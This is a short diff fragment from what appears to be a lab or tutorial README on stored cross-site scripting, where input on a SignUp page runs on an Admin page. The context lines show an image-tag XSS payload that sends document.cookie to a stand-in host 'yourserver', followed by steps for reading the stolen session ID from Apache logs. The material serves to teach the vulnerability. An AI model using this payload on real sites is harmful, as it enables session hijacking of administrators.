@@ -60,7 +60,7 @@ The XSS code can be entered on the SignUp page, and executed on the Admin page w
 
    ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
-2. Go to the Admin pages and take a look at the sign-ups. 
+2. Go to the Admin pages and take a look at the sign-ups.
 3. The session-id should now be written to the Apache logs of “yourserver”, which you can see with the "cat /var/log/apache2/access.log" command ("yourserver" would normally be an other server, that the hacker has access to). 
 
 or 
